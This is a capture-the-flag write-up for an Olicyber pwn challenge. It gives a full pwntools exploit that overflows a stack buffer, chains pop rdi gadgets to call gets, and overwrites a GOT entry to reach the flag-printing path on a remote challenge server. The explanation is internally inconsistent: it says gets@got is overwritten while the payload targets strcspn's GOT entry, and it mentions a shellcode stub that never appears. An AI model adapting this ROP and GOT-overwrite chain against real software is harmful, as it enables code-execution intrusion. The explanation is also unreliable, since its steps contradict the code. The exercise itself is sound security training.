---
title: "Guess the Number 2 — ROP Chain GOT Overwrite via gets"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "rop", "got-overwrite", "pwntools"]
difficulty: "intermediate"
summary: "Build a ROP chain that calls gets twice to plant arbitrary data in the GOT, redirect strcspn to a shellcode stub, then trigger the win print path."
---

## The Challenge

The sequel to Guess the Number. No shellcode execution directly — the binary asks for input into a stack buffer and has a score-printing function reachable only through indirect calls. The goal is to control what those indirect calls actually execute.

## Approach

The binary has no PIE, so all addresses (GOT, PLT, function symbols) are static. ELF provides them through `elf.got`, `elf.sym`, and `elf.plt`. The plan:

1. Overflow the initial buffer, chain a `pop rdi; ret` gadget three times to feed arguments to `gets`.
2. First `gets` call writes the flag address to memory.
3. Second `gets` call overwrites `gets@got` with the address of `p64(0x401150)` — a small stub that leads to the flag path.
4. `printScores` then dereferences the now-poisoned GOT entry and prints the flag.

The specific gadget at `0x401803` is `pop rdi; ret`. The overflow needs 28 bytes of padding to reach the saved return address.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./GuessTheNumber2')
if args.REMOTE:
    r = remote("gtn2.challs.olicyber.it", 10023)
else:
    r = gdb.debug(elf.path, '''
        continue
    ''')

FLAG = 0x404098
PAYLOAD = b'\0' * (28) + p64(0x401803) + (p64(0x401803) + p64(0x404098) + p64(elf.sym['gets'])) * 2 + \
    p64(0x401803) + p64(elf.got['strcspn']) + p64(elf.sym['gets']) + p64(0x401803) + p64(0x404098) + p64(elf.sym['printScores'])

r.recvuntil(b':\n')
r.sendline(PAYLOAD)
r.recvuntil(b'Secondary file\n')
r.sendline(b'1')
r.recvuntil(b'No high scores yet :(\n')

r.sendline(b'flag')
r.sendline(p64(0x401150))

r.interactive()
```

After the initial overflow fires: the first pair of `gets` calls writes `b'flag'` into `0x404098` and shadows that value again. Then `gets@got` gets overwritten with `0x401150`. When `printScores` eventually dereferences `strcspn` through the GOT it jumps to `0x401150` which routes to the flag-printing code.

## What I Learned

GOT overwrites let you redirect any indirect call without needing a direct stack write to that call site. The combination of `gets` (unbounded read) with `pop rdi; ret` as an argument-setter makes it a powerful ROP primitive: you can write arbitrary bytes to arbitrary writable addresses one call at a time.
